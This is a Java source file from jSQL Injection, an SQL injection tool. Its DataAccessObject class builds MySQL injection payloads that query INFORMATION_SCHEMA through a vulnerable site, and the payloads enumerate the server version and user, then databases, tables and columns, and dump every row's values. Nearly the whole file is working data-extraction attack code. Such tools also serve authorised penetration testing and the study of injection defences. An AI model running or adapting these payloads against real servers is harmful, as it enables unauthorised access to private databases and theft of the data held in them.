/*******************************************************************************
 * Copyhacked (H) 2012-2013.
 * This program and the accompanying materials
 * are made available under no term at all, use it like
 * you want, but share and discuss about it
 * every time possible with every body.
 * 
 * Contributors:
 *      ron190 at ymail dot com - initial implementation
 ******************************************************************************/
package com.jsql.model.ao;

import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import com.jsql.exception.PreparationException;
import com.jsql.exception.StoppableException;
import com.jsql.model.InjectionModel;
import com.jsql.model.Interruptable;
import com.jsql.model.InjectionModel.Stoppable_loopIntoResults;
import com.jsql.model.bean.Column;
import com.jsql.model.bean.Database;
import com.jsql.model.bean.ElementDatabase;
import com.jsql.model.bean.Request;
import com.jsql.model.bean.Table;
import com.jsql.tool.StringTool;

public class DataAccessObject {
    private InjectionModel model;
    
    public DataAccessObject(InjectionModel model){
        this.model = model;
    }
    
    /**
     * Get the initial database informations
     * => version{%}database{%}user{%}CURRENT_USER
     */
    public void getDBInfos() throws PreparationException, StoppableException {
        String[] sourcePage = {""};

        String hexResult = model.new Stoppable_loopIntoResults(model).action(
                "concat(" +
                        "hex(" +
                        "concat_ws(" +
                        "0x7b257d," +
                        "version()," +
                        "database()," +
                        "user()," +
                        "CURRENT_USER" +
                        ")" +
                        ")" +
                        "," +
                        "0x69" +
                        ")",
                        sourcePage,
                        false,
                        0,
                        null);

        if(hexResult.equals("")){
            model.sendResponseFromSite( "Show db info failed", sourcePage[0].trim() );
            throw new PreparationException();
        }

        model.versionDB = StringTool.hexstr(hexResult).split("\\{%\\}")[0];
        model.currentDB = StringTool.hexstr(hexResult).split("\\{%\\}")[1];
        model.currentUser = StringTool.hexstr(hexResult).split("\\{%\\}")[2];
        model.authenticatedUser = StringTool.hexstr(hexResult).split("\\{%\\}")[3];

        // Inform the view that info should be displayed
        Request request = new Request();
        request.setMessage("MessageInfo");
        model.interact(request);
    }
    
    /**
     * Get all databases names and table counts, then address them to the view
     * We use a hexadecimal format and parse the pattern:
     * => hh[database name 1]jj[number of tables]hhgghh[database name 2]jj[number of tables]hhggh...hi
     * We can't expect that all the data will be found in one request, Stoppable_loopIntoResults helps to obtain
     * the rest of the normally unreachable data,
     * The process can be stopped by the user
     */
    public void listDatabases() throws PreparationException, StoppableException {
        String[] sourcePage = {""};
        String hexResult = model.new Stoppable_loopIntoResults(model).action(
                "select+" +
                        "concat(" +
                        "group_concat(" +
                        "0x6868," +
                        "r," +
                        "0x6a6a," +
                        "hex(cast(q+as+char))," +
                        "0x6868" +
                        "+order+by+r+" +
                        "separator+0x6767" +
                        ")," +
                        "0x69" +
                        ")" +
                        "from(" +
                        "select+" +
                        "hex(cast(TABLE_SCHEMA+as+char))r," +
                        "count(TABLE_NAME)q+" +
                        "from+" +
                        "INFORMATION_SCHEMA.tables+" +
                        "group+by+r{limit}" +
                        ")x",
                        sourcePage,
                        true,
                        0,
                        null
                );

        // Parse all data we have retrieved
        Matcher regexSearch = Pattern.compile("hh([0-9A-F]*)jj([0-9A-F]*)(c)?hh", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(hexResult);

        if(!regexSearch.find()){
            model.sendResponseFromSite( "Fetching databases fails", sourcePage[0].trim() );
            throw new PreparationException();
        }
        regexSearch.reset();

        // Build an array of Database objects from the data we have parsed
        List<Database> databases = new ArrayList<Database>();
        while(regexSearch.find()){
            String databaseName = StringTool.hexstr(regexSearch.group(1));
            String tableCount = StringTool.hexstr(regexSearch.group(2));

            Database newDatabase = new Database(databaseName,tableCount.toString());
            databases.add(newDatabase);
        }

        // Address these objects to the view
        Request request = new Request();
        request.setMessage("AddDatabases");
        request.setParameters(databases);
        model.interact(request);
    }

    /**
     * Get all tables names and row counts, then address them to the view
     * We use a hexadecimal format and parse the pattern:
     * => hh[table name 1]jj[number of rows]hhgghh[table name 2]jj[number of rows]hhggh...hi
     * We can't expect that all the data will be found in one request, Stoppable_loopIntoResults helps to obtain
     * the rest of the unreachable data,
     * The process can be interrupted by the user (stop/pause)
     */
    public void listTables(Database database, Interruptable interruptable) throws NumberFormatException, PreparationException, StoppableException {
        // Inform the view that database has just been used
        Request request = new Request();
        request.setMessage("StartProgress");
        request.setParameters(database);
        model.interact(request);

        String tableCount = Integer.toString(database.getCount());

        String[] pageSource = {""};
        String hexResult = model.new Stoppable_loopIntoResults(model, interruptable).action(
                "select+" +
                        "concat(" +
                        "group_concat(" +
                        "0x6868," +
                        "hex(cast(r+as+char))," +
                        "0x6a6a," +
                        "hex(cast(ifnull(q,0x30)+as+char))," +
                        "0x6868+" +
                        "order+by+r+" +
                        "separator+0x6767" +
                        ")," +
                        "0x69" +
                        ")" +
                        "from(" +
                        "select+" +
                        "TABLE_NAME+r," +
                        "table_rows+q+" +
                        "from+" +
                        "information_schema.tables+" +
                        "where+" +
                        "TABLE_SCHEMA=0x" + StringTool.strhex(database.toString())  + "+" +
                        "order+by+r{limit}" +
                        ")x"
                        ,
                        pageSource,
                        true,
                        Integer.parseInt(tableCount),
                        database
                );

        // Parse all the data we have retrieved
        Matcher regexSearch =
                Pattern.compile("hh([0-9A-F]*)jj([0-9A-F]*)(c)?hh", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(hexResult);

        if(!regexSearch.find()){
            model.sendResponseFromSite( "Fetching tables fails", pageSource[0].trim() );
        }else{
            regexSearch.reset();

            // Build an array of Table objects from the data we have parsed
            List<Table> tables = new ArrayList<Table>();
            while(regexSearch.find()){
                String tableName = StringTool.hexstr(regexSearch.group(1));
                String rowCount  = StringTool.hexstr(regexSearch.group(2));

                Table newTable = new Table(tableName, rowCount, database);
                tables.add(newTable);
            }

            // Address these objects to the view
            Request request2 = new Request();
            request2.setMessage("AddTables");
            request2.setParameters(tables);
            model.interact(request2);
        }

        // Inform the view that database job is finished
        Request request3 = new Request();
        request3.setMessage("EndProgress");
        request3.setParameters(database);
        model.interact(request3);
    }

    /**
     * Get all columns names (we force count to 1, then ignore it), then address them to the view
     * We use a hexadecimal format and parse the pattern:
     * => hh[column name 1]jj31hhgghh[column name 2]jj31hhggh...hi
     * We can't expect that all the data will be found in one request, Stoppable_loopIntoResults helps to obtain
     * the rest of the unreachable data,
     * The process can be interrupted by the user (stop/pause)
     */
    public void listColumns(Table table, Interruptable interruptable) throws PreparationException, StoppableException {
        // Inform the view that table has just been used
        Request request = new Request();
        request.setMessage("StartIndeterminateProgress");
        request.setParameters(table);
        model.interact(request);

        String[] pageSource = {""};
        String hexResult = model.new Stoppable_loopIntoResults(model, interruptable).action(
                "select+" +
                        "concat(" +
                        "group_concat(" +
                        "0x6868," +
                        "hex(cast(n+as+char))," +
                        "0x6a6a," +
                        "0x3331," +
                        "0x6868+" +
                        "order+by+n+" +
                        "separator+0x6767" +
                        ")," +
                        "0x69" +
                        ")" +
                        "from(" +
                        "select+" +
                        "COLUMN_NAME+n+" +
                        "from+" +
                        "information_schema.columns+" +
                        "where+" +
                        "TABLE_SCHEMA=0x"+StringTool.strhex(table.getParent().toString())+"+" +
                        "and+" +
                        "TABLE_NAME=0x"+StringTool.strhex(table.toString())+"+" +
                        "order+by+n{limit}" +
                        ")x",
                        pageSource,
                        true,
                        0,
                        table
                );

        // Parse all the data we have retrieved
        Matcher regexSearch = Pattern.compile("hh([0-9A-F]*)jj([0-9A-F]*)(c)?hh", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(hexResult);

        if(!regexSearch.find()){
            model.sendResponseFromSite( "Fetching columns fails", pageSource[0].trim() );
        }else{
            regexSearch.reset();

            // Build an array of Column objects from the data we have parsed
            List<Column> columns = new ArrayList<Column>();
            while(regexSearch.find()){
                String columnName = StringTool.hexstr(regexSearch.group(1));

                Column newColumn = new Column(columnName, table);
                columns.add(newColumn);
            }

            // Address these objects to the view
            Request request2 = new Request();
            request2.setMessage("AddColumns");
            request2.setParameters(columns);
            model.interact(request2);
        }

        // Inform the view that table job is finished
        Request request3 = new Request();
        request3.setMessage("EndIndeterminateProgress");
        request3.setParameters(table);
        model.interact(request3);
    }

    /**
     * Get all values and their occurrences (we use GROUP BY), then address them to the view
     * We use a hexadecimal format and parse the pattern
     * => hh[value 1]jj[occurence]hhgghh[value 2]jj[occurence]hhggh...hi
     * We can't expect that all the data will be found in one request, Stoppable_loopIntoResults helps to obtain
     * the rest of the unreachable data,
     * The process can be interrupted by the user (stop/pause)
     */
    public void listValues(List<Column> argsElementDatabase, Interruptable interruptable) throws PreparationException, StoppableException {
        ElementDatabase database = argsElementDatabase.get(0).getParent().getParent();
        ElementDatabase table = argsElementDatabase.get(0).getParent();
        int rowCount = argsElementDatabase.get(0).getParent().getCount();

        // Inform the view that table has just been used
        Request request = new Request();
        request.setMessage("StartProgress");
        request.setParameters(table);
        model.interact(request);

        // Build an array of column names
        List<String> columnsName = new ArrayList<String>();
        for(ElementDatabase e: argsElementDatabase)
            columnsName.add(e.toString());

        // From that array, build the SQL fields nicely
        // =>  col1{%}col2...
        // ==> trim(ifnull(`col1`,0x00)),0x7f,trim(ifnull(`Col2`,0x00))...
        String[] arrayColumns = columnsName.toArray(new String[columnsName.size()]);
        String formatListColumn = StringTool.join(arrayColumns, "{%}");
        //        formatListColumn = formatListColumn.replace("{%}", "`),0x7f,trim(`" ); // 7f caractère d'effacement, dernier code hexa supporté par mysql, donne 3f=>? à partir de 80
        formatListColumn = formatListColumn.replace("{%}", "`,0x00)),0x7f,trim(ifnull(`" ); // 7f caractère d'effacement, dernier code hexa supporté par mysql, donne 3f=>? à partir de 80
        //        formatListColumn = "trim(`" + formatListColumn + "`)" ;
        formatListColumn = "trim(ifnull(`" + formatListColumn + "`,0x00))" ;

        String[] pageSource = {""};
        String hexResult = model.new Stoppable_loopIntoResults(model, interruptable).action(
                "select+concat(" +
                        "group_concat(" +
                        "0x6868," +
                        "r," +
                        "0x6a6a," +
                        "hex(cast(q+as+char))," +
                        "0x6868" +
                        "+order+by+r+separator+0x6767" +
                        ")," +
                        "0x69" +
                        ")from(" +
                        "select+" +
                        "hex(cast(concat("+ formatListColumn +")as+char))r," +
                        "count(*)q+" +
                        "from+" +
                        "`"+ database +"`.`"+ table +"`+" +
                        "group+by+r{limit}" +
                        ")x"
                        , pageSource, true, rowCount, table
                );

        // Parse all the data we have retrieved
        Matcher regexSearch = Pattern.compile("hh([0-9A-F]*)jj([0-9A-F]*)(c)?hh", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(hexResult);

        if(!regexSearch.find()){
            model.sendResponseFromSite( "Fetching values fails (row count can be inaccurate)", pageSource[0].trim() );
        }
        regexSearch.reset();

        int rowsFound = 0/*, duplicates = 0, cutted = 0*/;
        List<List<String>> listValues = new ArrayList<List<String>>();

        // Build a 2D array of strings from the data we have parsed
        // => row number, occurrence, value1, value2...
        while(regexSearch.find()){
            String values = StringTool.hexstr(regexSearch.group(1));
            int instances = Integer.parseInt( StringTool.hexstr(regexSearch.group(2)) );
            /*if(regexSearch.group(3) != null)
                cutted++;*/

            listValues.add(new ArrayList<String>());
            listValues.get(rowsFound).add(""+(rowsFound+1));
            listValues.get(rowsFound).add(""+instances);
            for(String cellValue: values.split(StringTool.hexstr("7f"),-1)){
                listValues.get(rowsFound).add(cellValue);
            }
            /*duplicates += instances - 1;*/
            rowsFound++;
            //            System.out.println( rowsFound + ". "+ instances +"x "+  values.replace("00", "").replace("\r\n", "").replace("\n", "").replace("\r", "") );
        }

        //        System.out.println( "# Results: "+ duplicates +" duplicates, "+ rowsFound +" distinct values, " /*+ (rowCount-rowsFound-duplicates) +" unreachables duplicates, "*/ + cutted + " rows truncated\n");

        // Add the default title to the columns: row number, occurrence
        columnsName.add(0,"duplicate");
        columnsName.add(0,"");

        // Build a proper 2D array from the data
        String[][] tableDatas = new String[listValues.size()][columnsName.size()] ;
        for(int indexRow=0; indexRow<listValues.size() ;indexRow++){
            boolean isIncomplete = false;
            for(int indexColumn=0; indexColumn<columnsName.size() ;indexColumn++){
                try{
                    tableDatas[indexRow][indexColumn] = listValues.get(indexRow).get(indexColumn);
                }catch(IndexOutOfBoundsException e){
                    isIncomplete = true;
                }
            }
            if(isIncomplete){
                model.sendErrorMessage("Max string length reached on the distant MySQL server, the row number "+(indexRow+1)+" is incomplete:\n" +
                        StringTool.join(listValues.get(indexRow).toArray(new String[listValues.get(indexRow).size()]), ", ") );
            }
        }

        arrayColumns = columnsName.toArray(new String[columnsName.size()]);
        // Group the columns names, values and Table object in one array
        Object[] objectData = {arrayColumns, tableDatas, table};

        // Address these objects to the view
        Request request2 = new Request();
        request2.setMessage("CreateValuesTab");
        request2.setParameters(objectData);
        model.interact(request2);

        // Inform the view that table job is finished
        Request request3 = new Request();
        request3.setMessage("EndProgress");
        request3.setParameters(table);
        model.interact(request3);
    }
}
